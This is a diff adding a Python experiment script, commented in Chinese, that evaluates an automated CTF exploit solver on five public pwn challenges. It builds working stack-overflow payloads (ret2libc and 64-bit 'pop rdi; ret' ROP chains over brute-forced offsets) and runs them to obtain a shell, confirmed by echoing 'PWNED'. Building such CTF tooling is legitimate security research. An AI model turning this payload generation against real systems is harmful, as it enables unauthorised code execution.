@@ -1,0 +1,225 @@
+"""
+v032_real_challenges.src — 用真实赛题验证「入口 → 链 → 执行」
+
+题目（ctf-wiki 收录的真实赛题，附件已下载到 experiments/EXP-0032/real）：
+    ret2text      bamboofox/NCTU：gets 溢出，跳 system("/bin/sh") 调用点
+    ret2libc1     bamboofox/NCTU：gets 溢出，直接调用 system@plt("/bin/sh")
+    rop           bamboofox/NCTU ret2syscall：无 system，需要 execve 系统调用链
+    contacts      CSAW 2015：格式化字符串，且有 canary
+    pwn3          CCTF 2016：格式化字符串
+
+流程
+    1. 产品分析（secknow.solving.binary）：位数、保护、导入入口、调用图、后门候选；
+    2. 产品链选择（secknow.solving.chains）：libc-call / ret2win / format-string；
+    3. 只有 libc-call 才尝试执行：用适配层（常驻 pwntools worker）构造并运行，
+       成功判据是真拿到 shell（发送 `echo PWNED` 并看到输出）。
+
+运行
+    python versions/v032_real_challenges.src
+
+产出
+    experiments/EXP-0032/{results.json,report.md}
+"""
+
+from __future__ import annotations
+
+import json
+import struct
+import sys
+import time
+from pathlib import Path
+
+ROOT = Path(__file__).resolve().parent.parent
+OUT_DIR = ROOT / "experiments" / "EXP-0032"
+REAL_DIR = OUT_DIR / "real"
+
+sys.path.insert(0, str(ROOT / "src"))
+
+from secknow.solving.adapters import PwntoolsWorker, ToolUnavailable  # noqa: E402
+from secknow.solving.binary import analyze  # noqa: E402
+from secknow.solving.chains import build_chains  # noqa: E402
+
+for _stream in (sys.stdout, sys.stderr):
+    if hasattr(_stream, "reconfigure"):
+        try:
+            _stream.reconfigure(encoding="utf-8", errors="replace")
+        except (ValueError, OSError):
+            pass
+
+
+def log(message: str) -> None:
+    print(f"[{time.strftime('%H:%M:%S')}] {message}", flush=True)
+
+
+CASES = [
+    ("ret2text", "栈溢出 → system('/bin/sh') 调用点"),
+    ("ret2libc1", "栈溢出 → system@plt('/bin/sh')"),
+    ("rop", "ret2syscall：无 system，需要 execve 链"),
+    ("contacts", "格式化字符串 + canary"),
+    ("pwn3", "格式化字符串"),
+]
+
+
+def p32(value: int) -> bytes:
+    return struct.pack("<I", value)
+
+
+def p64(value: int) -> bytes:
+    return struct.pack("<Q", value)
+
+
+def gadgets_for(worker: PwntoolsWorker, binary: Path) -> dict[str, int]:
+    try:
+        data = worker.gadgets(binary)
+    except ToolUnavailable:
+        return {}
+    found: dict[str, int] = {}
+    for gadget in data.get("gadgets", []):
+        key = ";".join(gadget["insns"])
+        found.setdefault(key, gadget["address"])
+    return found
+
+
+def build_libc_payloads(profile, worker: PwntoolsWorker) -> tuple[list[bytes], list[int], str | None]:
+    plt = profile.plt_names
+    system = plt.get("system")
+    shell = (profile.strings.get("/bin/sh") or profile.strings.get("/bin/bash") or [None])[0]
+    if system is None or shell is None:
+        return [], [], "no_system_or_shell"
+    if profile.bits == 32:
+        exit_plt = plt.get("exit", 0x08048400)
+        offsets = list(range(96, 161, 4))
+        payloads = [b"A" * offset + p32(system) + p32(exit_plt) + p32(shell)
+                    for offset in offsets]
+        return payloads, offsets, None
+    gadgets = gadgets_for(worker, profile.path)
+    pop_rdi = gadgets.get("pop rdi;ret") or gadgets.get("pop rdi; ret")
+    ret = gadgets.get("ret")
+    if pop_rdi is None:
+        return [], [], "gadget_missing:pop rdi;ret"
+    offsets = list(range(40, 201, 8))
+    payloads = []
+    for offset in offsets:
+        payload = b"A" * offset
+        if ret is not None:
+            payload += p64(ret)
+        payload += p64(pop_rdi) + p64(shell) + p64(system)
+        payloads.append(payload)
+    return payloads, offsets, None
+
+
+def evaluate(worker: PwntoolsWorker, name: str, note: str) -> dict:
+    binary = REAL_DIR / name
+    started = time.perf_counter()
+    record: dict = {"id": name, "note": note, "binary": str(binary)}
+    try:
+        profile = analyze(binary)
+    except Exception as error:  # noqa: BLE001 - 真实二进制解析失败要如实记录
+        record.update({"verdict": "failed", "reason": f"analyze:{type(error).__name__}",
+                       "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)})
+        return record
+
+    categories = [finding.category for finding in profile.findings()]
+    chains = build_chains(categories, profile)
+    record.update({
+        "bits": profile.bits, "pie": profile.is_pie, "canary": profile.has_canary,
+        "nx": profile.has_nx, "imports": sorted(profile.imports & {
+            "gets", "system", "printf", "fgets", "read", "execve"}),
+        "entries": categories,
+        "chains": [{"id": chain.chain_id, "status": chain.status, "reason": chain.reason}
+                   for chain in chains],
+        "win_candidates": profile.win_candidates[:3],
+    })
+
+    if profile.has_canary or profile.is_pie:
+        record.update({"verdict": "refused",
+                       "reason": "canary_present" if profile.has_canary else "pie_enabled",
+                       "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)})
+        return record
+
+    libc_chain = next((chain for chain in chains if chain.chain_id == "libc-call"), None)
+    if libc_chain is None:
+        reason = ("needs_leak_chain" if "format_string" in categories
+                  else "no_chain_for_this_class")
+        record.update({"verdict": "unsupported", "reason": reason,
+                       "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)})
+        return record
+
+    payloads, payload_offsets, error = build_libc_payloads(profile, worker)
+    if error is not None:
+        record.update({"verdict": "unsupported", "reason": error,
+                       "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)})
+        return record
+
+    try:
+        result = worker.run_chain(binary, payloads, post=b"echo PWNED; exit\n",
+                                  marker="PWNED", timeout=3)
+    except ToolUnavailable as tool_error:
+        record.update({"verdict": "failed", "reason": str(tool_error),
+                       "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)})
+        return record
+    record.update({
+        "solved": bool(result.get("solved")),
+        "attempts": result.get("attempts"),
+        "offset": (payload_offsets[result["index"]]
+                   if result.get("index") is not None else None),
+        "verdict": "solved" if result.get("solved") else "failed",
+        "reason": None if result.get("solved") else "payload_failed",
+        "elapsed_ms": round((time.perf_counter() - started) * 1000, 1),
+    })
+    return record
+
+
+def write_report(results: list[dict]) -> None:
+    OUT_DIR.mkdir(parents=True, exist_ok=True)
+    summary = {
+        "cases": len(results),
+        "solved": sum(1 for item in results if item.get("verdict") == "solved"),
+        "refused": sum(1 for item in results if item.get("verdict") == "refused"),
+        "unsupported": sum(1 for item in results if item.get("verdict") == "unsupported"),
+        "failed": sum(1 for item in results if item.get("verdict") == "failed"),
+    }
+    (OUT_DIR / "results.json").write_text(
+        json.dumps({"summary": summary, "cases": results}, ensure_ascii=False, indent=2),
+        encoding="utf-8")
+
+    lines = ["# EXP-0032 — 真实赛题验证", "",
+             "## 汇总", "", "```json", json.dumps(summary, ensure_ascii=False, indent=2),
+             "```", "",
+             "## 逐题", "",
+             "| 题 | 位数 | 保护 | 入口 | 链 | 判定 | 耗时 |",
+             "| --- | --- | --- | --- | --- | --- | --- |"]
+    for item in results:
+        protections = (f"canary={item.get('canary')} pie={item.get('pie')}"
+                       if "canary" in item else "—")
+        chain_ids = ", ".join(chain["id"] for chain in item.get("chains", [])) or "—"
+        lines.append(
+            f"| {item['id']} | {item.get('bits', '—')} | {protections} "
+            f"| {', '.join(item.get('entries', [])) or '无'} | {chain_ids} "
+            f"| {item.get('verdict')}（{item.get('reason') or '—'}） "
+            f"| {item.get('elapsed_ms')} ms |")
+    lines += ["", "## 说明", "",
+              "- 题目与附件来自 ctf-wiki 收录的真实赛题（NCTU bamboofox / CSAW 2015 / CCTF 2016）；",
+              "- 分析用产品代码，执行用适配层（pwntools 常驻 worker），成功判据是真拿到 shell；",
+              "- 没有 system/字符串的题（ret2syscall）与需要泄漏的格式化字符串题如实标为不支持。"]
+    (OUT_DIR / "report.md").write_text("\n".join(lines) + "\n", encoding="utf-8")
+
+
+def main() -> None:
+    worker = PwntoolsWorker()
+    available = worker.available(timeout=30)
+    log(f"worker available={available} version={worker.version}")
+    results = []
+    for name, note in CASES:
+        result = evaluate(worker, name, note)
+        results.append(result)
+        log(f"{name}: {result.get('verdict')} ({result.get('reason') or '—'})")
+    worker.close()
+    write_report(results)
+    summary = json.loads((OUT_DIR / "results.json").read_text(encoding="utf-8"))["summary"]
+    log(f"汇总：解出 {summary['solved']}/{summary['cases']}，拒绝 {summary['refused']}，"
+        f"不支持 {summary['unsupported']}，失败 {summary['failed']}")
+
+
+if __name__ == "__main__":
+    main()
